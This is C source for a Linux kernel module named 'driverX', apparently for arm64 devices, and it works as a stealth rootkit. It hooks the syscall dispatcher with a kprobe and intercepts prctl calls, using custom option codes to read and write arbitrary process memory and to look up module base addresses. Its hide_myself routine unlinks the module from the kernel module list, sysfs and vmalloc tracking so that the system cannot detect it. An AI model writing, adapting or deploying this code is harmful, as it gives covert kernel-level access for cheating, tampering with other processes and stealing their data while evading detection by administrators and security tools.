#include <linux/kallsyms.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/vmalloc.h>
#include <linux/tty.h>
#include <linux/miscdevice.h>
#include "comm.h"
#include "memory.h"
#include "process.h"

#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 10, 0)
#include <linux/minmax.h>
#endif
#include <linux/init.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/sysfs.h>
#include <linux/prctl.h>
#include <linux/errno.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name",
};
#endif

static char *mCommon = "invoke_syscall";
module_param(mCommon, charp, 0644);
MODULE_PARM_DESC(mCommon, "Parameter");

static void __init hide_myself(void)
{
    struct vmap_area *va, *vtmp;
    struct module_use *use, *tmp;
    struct list_head *_vmap_area_list;
    struct rb_root *_vmap_area_root;

#ifdef KPROBE_LOOKUP
    unsigned long (*kallsyms_lookup_name)(const char *name);
    if (register_kprobe(&kp) < 0) {
        pr_err("driverX: module hide failed");
        return;
    }
    kallsyms_lookup_name = (unsigned long (*)(const char *name))kp.addr;
    unregister_kprobe(&kp);
#endif

    _vmap_area_list = (struct list_head *)kallsyms_lookup_name("vmap_area_list");
    _vmap_area_root = (struct rb_root *)kallsyms_lookup_name("vmap_area_root");

    list_for_each_entry_safe(va, vtmp, _vmap_area_list, list) {
        if ((unsigned long)THIS_MODULE > va->va_start &&
            (unsigned long)THIS_MODULE < va->va_end) {
            list_del(&va->list);
            rb_erase(&va->rb_node, _vmap_area_root);
        }
    }

    list_del_init(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);

    list_for_each_entry_safe(use, tmp, &THIS_MODULE->target_list, target_list) {
        list_del(&use->source_list);
        list_del(&use->target_list);
        sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
        kfree(use);
    }
}

bool isFirst = true;
static struct kprobe kpp;

long dispatch_prctl(struct task_struct *task, unsigned long option,
                   unsigned long arg2, unsigned long arg3, unsigned long arg4)
{
    void __user *arg = (void __user *)arg2;
    COPY_MEMORY cm;
    MODULE_BASE mb;
    char name[256] = {0};

    if (isFirst) {
        isFirst = false;
    }

    switch (option) {
        case OP_READ_MEM:
            if (copy_from_user(&cm, arg, sizeof(cm)))
                return -EFAULT;
            if (!read_process_memory(cm.pid, cm.addr, cm.buffer, cm.size, false))
                return -EINVAL;
            break;

        case OP_RW_MEM:
            if (copy_from_user(&cm, arg, sizeof(cm)))
                return -EFAULT;
            if (!read_process_memory(cm.pid, cm.addr, cm.buffer, cm.size, true))
                return -EINVAL;
            break;

        case OP_WRITE_MEM:
            if (copy_from_user(&cm, arg, sizeof(cm)))
                return -EFAULT;
            if (!write_process_memory(cm.pid, cm.addr, cm.buffer, cm.size))
                return -EINVAL;
            break;

        case OP_MODULE_BASE:
            if (copy_from_user(&mb, arg, sizeof(mb)) || 
               copy_from_user(name, (void __user *)mb.name, sizeof(name)-1))
                return -EFAULT;
            mb.base = get_module_base(mb.pid, name);
            if (copy_to_user(arg, &mb, sizeof(mb)))
                return -EFAULT;
            break;

        default:
            return -EINVAL;
    }
    return 0;
}

static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    if ((uint32_t)(regs->regs[1]) == 167) { // PRCTL
        unsigned long option = regs->user_regs.regs[0];
        void __user *arg = (void __user *)regs->user_regs.regs[1];
        
        // Handle initialization command
        if (option == OP_INIT_KEY) {
            pr_info("driverX: Initialization command received");
            return 0;
        }
        
        // Process memory operations directly
        return dispatch_prctl(current, option, (unsigned long)arg, 0, 0);
    }
    return 0;
}

static int __init hide_init(void)
{
    int ret;
    kpp.symbol_name = mCommon;
    kpp.pre_handler = handler_pre;
    
    ret = register_kprobe(&kpp);
    if (ret < 0) {
        pr_err("driverX: Failed to register kprobe: %d (%s)\n", ret, kpp.symbol_name);
        return ret;
    }
    
    hide_myself();
    pr_info("driverX: Module loaded successfully");
    return 0;
}

static void __exit hide_exit(void)
{
    unregister_kprobe(&kpp);
    pr_info("driverX: Module unloaded");
}

module_init(hide_init);
module_exit(hide_exit);

MODULE_AUTHOR("exianb");
MODULE_DESCRIPTION("exianb");
MODULE_LICENSE("GPL");

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 0)
MODULE_IMPORT_NS(VFS_internal_I_am_really_a_filesystem_and_am_NOT_a_driver);
#endif
